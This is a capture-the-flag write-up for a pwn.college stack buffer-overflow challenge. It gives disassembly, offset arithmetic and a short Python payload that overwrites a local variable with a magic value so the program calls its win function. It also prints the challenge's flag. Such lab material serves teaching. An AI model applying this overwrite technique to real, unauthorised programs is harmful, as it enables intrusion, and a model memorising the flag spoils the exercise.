# Variable Control (hard)

## Challenge
This challenge is identical to its "easy" version from a security perspective, but has the following changes:

- Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
- The source code is not provided. You will need to reverse-engineer the binary, but remember, the challenge is conceptually the same as the easy version, so it can be helpful to have the easy version's source code as a secondary reference during your reversing process!
- Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!

## Solve
**Flag:** `pwn.college{Iytg-wWXkaL8EazOV8cu_NwV8dZ.QX4UzMzwyNyAzNzEzW}`

#### What the Program Does?
Like the previous one, the challenge:
- Allocates a stack frame and a local buffer.
- Reads bytes from stdin into that buffer.
- Later, it loads a **4-byte local variable** from the stack (`mov -0x18(%rbp), %eax`) and compares that 32-bit value to the constant `0x5d36dc0a`.
- If equal, it calls the `win` function.
    ```assembly
      40206e:       3d 0a dc 36 5d          cmp    $0x5d36dc0a,%eax
      402073:       75 0a                   jne    40207f <challenge+0x11f>
      402075:       b8 00 00 00 00          mov    $0x0,%eax
      40207a:       e8 da fd ff ff          call   401e59 <win>
  ```
#### Aim:
Place the required 32-bit value at the right spot on the stack.

#### Where to place the magic number - offset math
From the assembly, we can infer that:
```asm
buffer base:       -0x60  <-- read writes starting here
...
buffer + 0x48:     -0x18  <-- program reads 4 bytes here into EAX and compares
...
canary location:   -0x8   <-- saved stack canary (if we overwrite past this, stack check fails)
```
We need the magic to live at address -0x18(%rbp) but read starts at -0x60(%rbp).

Compute difference:
- `0x60` minus 0x18:
    - `0x60 = 96` (decimal)
    - `0x18 = 24` (decimal)
    - `96 - 24 = 72` (decimal)
    - `72` decimal = `0x48` hex

So the magic must begin **72 bytes (0x48)** after the buffer start.
That means: `72 bytes filler + 4 bytes magic` = the bytes that land at `-0x18`.

We use a custom script to pass the number to the executable.
**Also, keep the little-endian in mind while writing the payload.**

#### Python Script Used
```python
payload = b'A'*0x48 + b'\x0a\xdc\x36\x5d'   # 0x48 filler, then 0x5d36dc0a little-endian
open('payload.bin','wb').write(payload)
```
#### Commands used after creating the script
```
python script.py
cat payload.bin | /challenge/./binary-exploitation-var-control
```

## New Learnings
- Disassembling binaries.
- Reading assembly.
